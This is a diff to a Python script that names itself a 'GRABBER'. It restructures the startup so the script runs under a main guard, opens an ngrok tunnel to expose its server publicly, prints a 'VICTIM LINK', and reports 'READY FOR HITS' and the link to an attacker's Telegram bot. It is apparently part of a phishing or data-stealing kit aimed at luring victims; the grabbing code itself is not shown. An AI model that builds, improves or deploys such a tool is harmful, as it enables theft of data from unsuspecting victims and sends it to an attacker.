@@ -1227,69 +1227,66 @@ def run_admin():
         print(f"Admin Panel Error: {e}")
 
 
-print("STARTING GRABBER...")
-send_telegram("BOT ONLINE - READY FOR HITS")
-
-threading.Thread(target=run_main, daemon=True).start()
-threading.Thread(target=run_admin, daemon=True).start()
-
-
-def create_ngrok_tunnel(max_attempts=5, wait_seconds=15):
-    # If pyngrok wasn't imported, bail out early to avoid NameError
-    if not ngrok or not conf:
-        print("pyngrok not installed or failed to import; cannot create tunnel programmatically.")
+if __name__ == '__main__':
+    print("STARTING GRABBER...")
+    send_telegram("BOT ONLINE - READY FOR HITS")
+    
+    threading.Thread(target=run_main, daemon=True).start()
+    threading.Thread(target=run_admin, daemon=True).start()
+    
+    def create_ngrok_tunnel(max_attempts=5, wait_seconds=15):
+        if not ngrok or not conf:
+            print("pyngrok not installed or failed to import; cannot create tunnel programmatically.")
+            return None
+        if NGROK_AUTH_TOKEN:
+            conf.get_default().auth_token = NGROK_AUTH_TOKEN
+            print("Using ngrok auth token from script config.")
+        else:
+            print("No ngrok auth token configured; tunnel may fail.")
+        for attempt in range(1, max_attempts + 1):
+            try:
+                ngrok.kill()
+            except Exception:
+                pass
+            time.sleep(1)
+            try:
+                public_url = ngrok.connect(PORT).public_url
+                print(f"Ngrok tunnel created: {public_url}")
+                return public_url
+            except Exception as e:
+                err_str = str(e)
+                print(f"Ngrok attempt {attempt} failed: {err_str}")
+                if attempt < max_attempts:
+                    print(f"Retrying ngrok in {wait_seconds} seconds...")
+                    time.sleep(wait_seconds)
         return None
-
-    if NGROK_AUTH_TOKEN:
-        conf.get_default().auth_token = NGROK_AUTH_TOKEN
-        print("Using ngrok auth token from script config.")
+    
+    if USE_NGROK:
+        time.sleep(2)
+        NGROK_URL = create_ngrok_tunnel()
+        if not NGROK_URL:
+            NGROK_URL = f"http://127.0.0.1:{PORT}"
+            print(f"Falling back to local server: {NGROK_URL}")
     else:
-        print("No ngrok auth token configured; tunnel may fail.")
-
-    for attempt in range(1, max_attempts + 1):
-        try:
-            ngrok.kill()
-        except Exception:
-            pass
-        time.sleep(1)
-        try:
-            public_url = ngrok.connect(PORT).public_url
-            print(f"Ngrok tunnel created: {public_url}")
-            return public_url
-        except Exception as e:
-            err_str = str(e)
-            print(f"Ngrok attempt {attempt} failed: {err_str}")
-            if attempt < max_attempts:
-                print(f"Retrying ngrok in {wait_seconds} seconds...")
-                time.sleep(wait_seconds)
-    return None
-
-if USE_NGROK:
-    time.sleep(2)
-    NGROK_URL = create_ngrok_tunnel()
-    if not NGROK_URL:
         NGROK_URL = f"http://127.0.0.1:{PORT}"
-        print(f"Falling back to local server: {NGROK_URL}")
-else:
-    NGROK_URL = f"http://127.0.0.1:{PORT}"
-    print("ngrok disabled: using local-only victim link")
-
-BYPASS_URL = NGROK_URL + "/go"
-print(f"\n*** VICTIM LINK: {BYPASS_URL} ***")
-print(f"*** DIRECT LINK: {NGROK_URL} ***")
-print(f"ADMIN PANEL: http://localhost:{ADMIN_PORT}")
-try:
-    send_telegram(f"BOT READY\nVICTIM LINK: {BYPASS_URL}")
-except Exception as e:
-    print(f"Telegram notify failed: {e}")
-try:
-    webbrowser.open(f"http://localhost:{ADMIN_PORT}")
-except Exception as e:
-    print(f"Browser open failed: {e}")
-
-print("\nServer is running. Press Ctrl+C in this terminal to stop.")
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("\nStopping server...")
+        print("ngrok disabled: using local-only victim link")
+    
+    BYPASS_URL = NGROK_URL + "/go"
+    print(f"\n*** VICTIM LINK: {BYPASS_URL} ***")
+    print(f"*** DIRECT LINK: {NGROK_URL} ***")
+    print(f"ADMIN PANEL: http://localhost:{ADMIN_PORT}")
+    try:
+        send_telegram(f"BOT READY\nVICTIM LINK: {BYPASS_URL}")
+    except Exception as e:
+        print(f"Telegram notify failed: {e}")
+    try:
+        webbrowser.open(f"http://localhost:{ADMIN_PORT}")
+    except Exception as e:
+        print(f"Browser open failed: {e}")
+    
+    print("\nServer is running. Press Ctrl+C in this terminal to stop.")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nStopping server...")
